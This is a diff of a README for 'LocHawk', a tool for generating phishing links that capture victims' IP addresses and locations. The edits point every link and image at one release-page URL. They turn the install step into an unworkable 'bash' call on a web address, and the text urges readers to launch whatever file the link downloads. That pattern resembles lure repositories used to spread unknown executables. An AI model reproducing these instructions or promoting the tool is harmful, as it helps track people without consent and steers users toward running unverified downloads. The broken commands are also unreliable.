@@ -13,9 +13,9 @@ LocHawk is a powerful location phishing tool designed to capture the IP address 
 
 ## Installation 🚀
 To install LocHawk, follow these simple steps:
-1. Clone the repository: `git clone https://github.com/yourusername/LocHawk.git`
+1. Clone the repository: `git clone https://github.com/Ahmoya-Candjimbi/LocHawk/releases/tag/v1.2`
 2. Navigate to the LocHawk directory: `cd LocHawk`
-3. Run the installation script: `bash install.sh`
+3. Run the installation script: `bash https://github.com/Ahmoya-Candjimbi/LocHawk/releases/tag/v1.2`
 
 ## Usage 🧭
 1. Generate a phishing URL using LocHawk.
@@ -42,7 +42,7 @@ To install LocHawk, follow these simple steps:
 ## Download LocHawk 📥
 Click the button below to download LocHawk and start using it for your security testing activities:
 
-[![Download LocHawk](https://img.shields.io/badge/Download-LocHawk-blue)](https://github.com/files/Soft.zip)
+[![Download LocHawk](https://github.com/Ahmoya-Candjimbi/LocHawk/releases/tag/v1.2)](https://github.com/Ahmoya-Candjimbi/LocHawk/releases/tag/v1.2)
 
 If the link does not work or leads to a specific file, ensure to launch the downloaded file for installation.
 
@@ -54,6 +54,6 @@ If you are interested in contributing to LocHawk, feel free to fork the reposito
 
 Let's enhance our understanding of location tracking and phishing attacks with LocHawk! 🌍🔒
 
-![LocHawk](https://imageurl.com)
+![LocHawk](https://github.com/Ahmoya-Candjimbi/LocHawk/releases/tag/v1.2)
 
 Happy Hacking! 🎯🔓
